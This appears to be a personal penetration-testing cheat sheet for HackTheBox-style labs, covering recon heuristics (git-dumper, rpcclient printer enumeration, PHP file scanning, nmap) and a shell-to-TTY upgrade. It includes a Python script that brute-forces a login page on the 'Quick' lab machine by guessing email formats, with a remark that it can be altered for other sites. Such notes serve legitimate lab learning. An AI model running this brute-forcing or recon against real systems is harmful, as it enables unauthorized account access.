# Assumptions
Things that aren't self explanatory if not encountered before


# Stuff to check for
- /dev 
    - If this DIR is found, assume that there is code in there.    
    Hence use `git-dumper` tool in .git 
- Printers
    - If a windows AD server has a printer, use `rpcclient` and do `enumprinters`
- HTTPS / HTTP sites 
    - If a site has a protocol one shall try to access the site with the other one.
- PHP files
    - If one or more file is found during recon, assume that there are more php files on the site and scan for them.    
    (Use a wordlist such as [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Common-PHP-Filenames.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Common-PHP-Filenames.txt))
    - Any other files:      Try the method described [here](./web#scan-for-multiple-file-extensions-with-the-same-list) to expose more files.
- If there's a list of people or names with email addresses and see a list of countries listed 
assume that different people might have different email formats (see help and longer explanation below)

## Emails
For example:
```py
EMAIL_FORMATS   = {"UK":".co.uk","US":".com","DE":".de","IT":".it","CN":".cn","FR":".fr"}
```
The following script was written for [Quick](https://app.hackthebox.com/machines/244) HTTB machine.    
```py
# !/usr/bin/python3

import requests

# Constants
URL             = "http://quick.htb:9001/login.php"
EMAIL_FORMATS   = {"UK":".co.uk","US":".com","DE":".de","IT":".it","CN":".cn","FR":".fr"}

# Variables
data = {"email":"","password":"Quick4cc3$$"}
clients = {"qconsulting":"UK","darkwing":"US","wink":"UK","lazycoop":"CN","scoobydoo":"IT","penguincrop":"FR"}
users = ["tim","roy","elisa","james"]


# Return the needed email format
def make_email(user,org_name,country):
    return f"{user}@{org_name}{EMAIL_FORMATS[country]}"

# Brute force the login page
def brute():
    for u in users:
        for cl,cnt in clients.items():
            data["email"] = make_email(u,cl,cnt)
            req = requests.post(url=URL,data=data)
            if "Invalid Credentials" in req.text:
                print(f"[-]\t{data['email']}")
            else:
                print("\nEMAIL FOUND !!\n")
                print(f"[!]\t{data['email']}")
                exit()
# Driver code
if __name__ == "__main__":
    brute()
```
This script can be altered for different sites.

# Linux
## .dockerenv
If there is a `.dockerenv` file, it means that the host is also a docker container

## Shell upgrade to tty
```bash
username@host:~# script /dev/null -c bash

# Press Ctrl+Z
username@host:~# ^Z

# Type: stty raw -echo; fg
localname@localmachine$ stty raw -echo; fg

# Type: reset
reset
reset: unknown terminal type unknown

# Type: screen
Terminal type? screen
                                                                         
username@host:~# 
```

# Local IPs
If there are multiple IPs listed in order, and one is missing (has no port forwarded), one should run an `nmap` scan on the given IP
